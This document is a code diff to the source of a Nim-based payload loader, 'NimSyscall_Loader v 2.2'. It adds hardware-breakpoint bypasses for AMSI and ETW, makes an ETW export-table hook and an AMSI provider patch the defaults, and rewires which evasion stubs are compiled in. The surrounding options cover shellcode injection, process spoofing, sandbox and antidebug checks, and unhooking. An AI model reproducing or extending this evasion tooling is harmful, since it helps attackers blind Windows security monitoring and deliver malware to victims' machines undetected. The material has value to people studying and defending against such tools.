@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --execute-if=<procname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --ClrPatch --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --execute-if=<procname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --ClrPatch --amsihwbp --etwhwbp --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -91,8 +91,8 @@ Options:
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
-  --noETW    Don't use ETW Patch
-  --noAMSI    Don't patch AMSI
+  --noETW    Don't bypass ETW data collection
+  --noAMSI    Don't bypass AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
   --hide    Compile with --app:gui flag, so that the console won't pop up
   --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
@@ -148,6 +148,8 @@ Options:
   --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
   --PatchETW    Bypass ETW by patching ntdll.dll/NtTraceEvent via Syscalls
   --ClrPatch    Patch the CLR to bypass AMSI
+  --amsihwbp    Use Hardware Breakpoints to bypass AMSI
+  --etwhwbp    Use Hardware Breakpoints to bypass ETW (deprecated, unstable now)
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
   --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
@@ -308,13 +310,14 @@ var
     interactivePS: bool = false
     arguments: string = ""
     embeddedArguments : bool = false
-    AMSI: bool = true
+    AMSI: bool = false
     oneShot: bool = true
     AMSIPatch: bool = false
     ClrPatch: bool = false
-    AMSIProviderPatch: bool = false
+    AMSIProviderPatch: bool = true
     AMSICreateSectionHook: bool = false
-    ETW: bool = true
+    ETW: bool = false
+    ETWEATHook: bool = true
     ETWPatch: bool = false
     COMVARETW: bool = false
     shellcode: bool = true
@@ -529,10 +532,21 @@ if args["--ClrPatch"]:
   ClrPatch = true
   AMSI = false
   AMSIPatch = false
+  AMSICreateSectionHook = false
+  AMSIProviderPatch = false
+
+if args["--amsihwbp"]:
+  AMSI = true
+
+if args["--etwhwbp"]:
+    ETW = true
+    ETWEATHook = false
+    echo "Warning: --etwhwbp is deprecated and unstable now, use --PatchETW instead"
 
 if args["--PatchETW"]:
   ETWPatch = true
   ETW = false
+  ETWEATHook = false
 
 if args["--shellcodeFile"]:
     retrieveFromFile = true
@@ -679,6 +693,9 @@ if args["--mapSection"]:
 
 if args["--noAMSI"]:
   AMSI = false
+  ClrPatch = false
+  AMSICreateSectionHook = false
+  AMSIProviderPatch = false
 
 if args["--AMSIProviderPatch"]:
   AMSIProviderPatch = true
@@ -687,15 +704,20 @@ if args["--AMSIProviderPatch"]:
 if args["--AMSINtCreateSectionHook"]:
   AMSICreateSectionHook = true
   AMSI = false
+  AMSIProviderPatch = false
+  ClrPatch = false
 
 if args["--noETW"]:
   ETW = false
+  COMVARETW = false
 
 if args["--large"]:
   big = true
 
 if args["--COMVARETW"]:
   COMVARETW = true
+  ETWEATHook = false
+  ETW = false
 
 if args["--unhook"]:
   unhook = true
@@ -4175,6 +4197,9 @@ if(environmentalDomain):
 if(environmentalUsername):
     stub.add(UsernameKeyStub)
 
+if (ETWEATHook):
+    stub.add(EATHookStub)
+
 if (syswhispers):
     if(jump):
         if (not compileX86):
@@ -4330,11 +4355,10 @@ if (localinject):
         stub.add(AMSINtCreateSectionHookStub)
     if(ETWPatch):
         stub.add(ETWPatchStub)
+    if (COMVARETW):
+        stub.add(ETWCOMVARStub)
     if (ETW):
-        if (COMVARETW):
-            stub.add(ETWCOMVARStub)
-        else:
-            stub.add(ETWStub)
+        stub.add(ETWStub)
 stub.add(getRandStub())
 stub.add(getRandStub())
 if (peload):
